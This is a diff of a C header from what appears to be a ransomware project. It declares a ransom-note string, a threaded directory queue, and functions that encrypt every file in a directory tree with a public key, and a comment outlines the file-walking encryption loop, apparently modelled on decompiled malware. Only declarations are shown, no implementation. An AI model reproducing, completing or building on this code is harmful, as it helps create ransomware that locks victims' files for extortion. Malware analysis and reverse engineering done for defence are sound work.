@@ -1,22 +1,38 @@
 #pragma once
-#include "Crypto.h"
+
 #ifndef __Threading_h__
 #define __Threading_h__
+#include "Crypto.h"
+extern LPCSTR ransomNoteContent;
+
+struct LL_NODE {
+	LPSTR dirName;
+	struct LL_NODE* nextNode;
+};
+
 
 typedef struct {
 	HANDLE* threadArray;
-	DWORD threadCount;
-	BOOL isEncrypting;
+	int threadCount;
 	CRITICAL_SECTION threadCriticalSection;
-	LPSTR dirPath;
-	//DWORD drive_name_ptr;
+	LL_NODE* head;
+	LL_NODE* tail;
 } THREAD_STRUCT;
 
 extern THREAD_STRUCT threadStruct;
 void threadEncrypt(THREAD_STRUCT* pThreadStruct);
 int initThreadStruct();
-int launchThreadEncrypt();
-void cleanUpThreadStruct();
+void launchThreadEncrypt();
+void cleanUpThread();
+
+
+
+void freeNode(LL_NODE* node);
+LL_NODE* popNode(THREAD_STRUCT* pThreadStruct);
+int addNode(THREAD_STRUCT* pThreadStruct, LPSTR name);
+LL_NODE* newNode();
+
+
 
 // takes in HCRYPTKEY, HCRYPTPROV, directory_to_encrypt
 // 1. FindFirstFileW in the directory
@@ -26,5 +42,5 @@ void cleanUpThreadStruct();
 // 3. If file is a normal file, encrypt -> loop back
 // 4. while ( FindNextFileW(file_search_handle, &lpFindFileData, v56) );
 // 5. FindClose
-int mainThreadEncryption(HCRYPTPROV hCryptProv, HCRYPTKEY publicKey, BYTE* key, BYTE* nonce, LPSTR directoryName, THREAD_STRUCT* pThreadStruct);
+int mainThreadEncryption(HCRYPTPROV hCryptProv, HCRYPTKEY publicKey, LPSTR directoryName, THREAD_STRUCT* pThreadStruct);
 #endif
